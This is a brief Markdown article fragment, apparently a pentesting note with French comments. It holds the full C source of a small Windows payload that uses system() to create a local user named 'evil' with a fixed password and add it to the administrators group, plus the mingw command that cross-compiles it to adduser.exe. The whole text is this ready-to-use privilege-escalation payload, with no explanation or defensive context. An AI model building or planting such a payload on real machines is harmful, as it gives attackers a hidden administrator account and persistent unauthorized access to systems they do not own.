---
public: true # set to true to make the article publishable
---

```
cat adduser.c

#include <stdlib.h>

int main()
{
	int i;
	i = system("net user evil P@$$w0rd /add");
	i = system("net localgroup administrators /add evil");
}
```

```
# cross compilation de l'exécutable
sudo i686-w64-mingw32-gcc adduser.c -o adduser.exe
```